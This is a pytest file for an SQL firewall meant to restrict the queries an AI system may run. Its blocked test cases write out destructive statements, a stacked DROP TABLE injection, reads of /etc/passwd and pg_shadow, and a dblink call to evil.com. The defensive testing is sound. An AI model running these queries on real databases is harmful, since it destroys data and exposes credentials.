"""Firewall tests -- these are the most important tests in the project.

An AI system that can run arbitrary SQL is dangerous. These tests verify
that the firewall correctly blocks every category of dangerous query,
correctly allows safe queries, and injects limits as declared.

No database required -- the firewall is pure Python + SQLGlot.
"""

import pytest
from app.security.sql_firewall import SQLFirewall

fw = SQLFirewall()


# ── Allowed queries ───────────────────────────────────────────────────────────

def test_simple_select_allowed():
    v = fw.check("SELECT id, name FROM customers")
    assert v.allowed

def test_select_with_join_allowed():
    v = fw.check("""
        SELECT o.id, c.segment, SUM(oi.quantity * oi.unit_price) AS revenue
        FROM orders o
        JOIN customers c ON c.id = o.customer_id
        JOIN order_items oi ON oi.order_id = o.id
        WHERE o.status = 'completed'
        GROUP BY o.id, c.segment
        LIMIT 100
    """)
    assert v.allowed

def test_cte_allowed():
    v = fw.check("""
        WITH monthly AS (
            SELECT date_trunc('month', order_date) AS month,
                   SUM(quantity * unit_price) AS revenue
            FROM orders
            JOIN order_items ON order_items.order_id = orders.id
            GROUP BY 1
        )
        SELECT * FROM monthly ORDER BY month
    """)
    assert v.allowed

def test_subquery_allowed():
    v = fw.check("""
        SELECT segment, total
        FROM (
            SELECT c.segment, COUNT(*) AS total
            FROM customers c
            JOIN orders o ON o.customer_id = c.id
            GROUP BY c.segment
        ) sub
        ORDER BY total DESC
    """)
    assert v.allowed

def test_union_allowed():
    v = fw.check("""
        SELECT 'current' AS period, SUM(quantity * unit_price) AS revenue
        FROM order_items JOIN orders ON orders.id = order_items.order_id
        WHERE orders.order_date >= '2026-06-01'
        UNION ALL
        SELECT 'prior', SUM(quantity * unit_price)
        FROM order_items JOIN orders ON orders.id = order_items.order_id
        WHERE orders.order_date >= '2026-05-01' AND orders.order_date < '2026-06-01'
    """)
    assert v.allowed


# ── Blocked: mutating / DDL statements ───────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "DELETE FROM orders WHERE id = 1",
    "DROP TABLE customers",
    "INSERT INTO orders (customer_id) VALUES (1)",
    "UPDATE products SET price = 0",
    "ALTER TABLE orders ADD COLUMN hack TEXT",
    "TRUNCATE TABLE payments",
    "CREATE TABLE pwned (x TEXT)",
])
def test_mutating_statements_blocked(sql):
    v = fw.check(sql)
    assert not v.allowed
    assert len(v.violations) > 0


# ── Blocked: multiple statements ─────────────────────────────────────────────

def test_multiple_statements_blocked():
    v = fw.check("SELECT 1; DROP TABLE customers")
    assert not v.allowed
    assert any("Multiple" in violation for violation in v.violations)


# ── Blocked: dangerous functions ─────────────────────────────────────────────

@pytest.mark.parametrize("sql", [
    "SELECT pg_sleep(10)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM orders WHERE id = (SELECT 1 FROM dblink('host=evil.com', 'SELECT 1') t(x int))",
])
def test_dangerous_functions_blocked(sql):
    v = fw.check(sql)
    assert not v.allowed


# ── Blocked: tables not in allowlist ─────────────────────────────────────────

def test_unknown_table_blocked():
    v = fw.check("SELECT * FROM secret_admin_table")
    assert not v.allowed
    assert any("allowlist" in violation for violation in v.violations)

def test_pg_catalog_blocked():
    v = fw.check("SELECT * FROM pg_shadow")
    assert not v.allowed


# ── Blocked: PII columns ─────────────────────────────────────────────────────

def test_email_column_blocked():
    v = fw.check("SELECT id, email FROM customers")
    assert not v.allowed
    assert any("email" in violation for violation in v.violations)


# ── Limit enforcement ─────────────────────────────────────────────────────────

def test_limit_injected_when_missing():
    v = fw.check("SELECT * FROM orders")
    assert v.allowed
    assert any("injected" in m for m in v.modifications)
    assert "LIMIT" in v.sql.upper()

def test_limit_reduced_when_too_large():
    v = fw.check("SELECT * FROM orders LIMIT 999999")
    assert v.allowed
    assert any("reduced" in m for m in v.modifications)
    assert "LIMIT 10000" in v.sql.upper()

def test_small_limit_unchanged():
    v = fw.check("SELECT * FROM orders LIMIT 50")
    assert v.allowed
    assert not any("reduced" in m for m in v.modifications)
    assert "LIMIT 50" in v.sql.upper()


# ── Tables referenced ─────────────────────────────────────────────────────────

def test_tables_referenced_extracted():
    v = fw.check("""
        SELECT o.id FROM orders o
        JOIN customers c ON c.id = o.customer_id
        LIMIT 10
    """)
    assert v.allowed
    assert "orders" in v.tables_referenced
    assert "customers" in v.tables_referenced


# ── Parse errors ─────────────────────────────────────────────────────────────

def test_invalid_sql_blocked():
    v = fw.check("THIS IS NOT SQL AT ALL $$$$")
    assert not v.allowed


# ── Custom firewall config ────────────────────────────────────────────────────

def test_custom_max_rows():
    fw_small = SQLFirewall(max_rows=100)
    v = fw_small.check("SELECT * FROM orders LIMIT 5000")
    assert v.allowed
    assert any("reduced" in m for m in v.modifications)

def test_custom_allowed_tables():
    fw_restricted = SQLFirewall(allowed_tables={"orders"})
    assert fw_restricted.check("SELECT * FROM orders LIMIT 1").allowed
    assert not fw_restricted.check("SELECT * FROM customers LIMIT 1").allowed
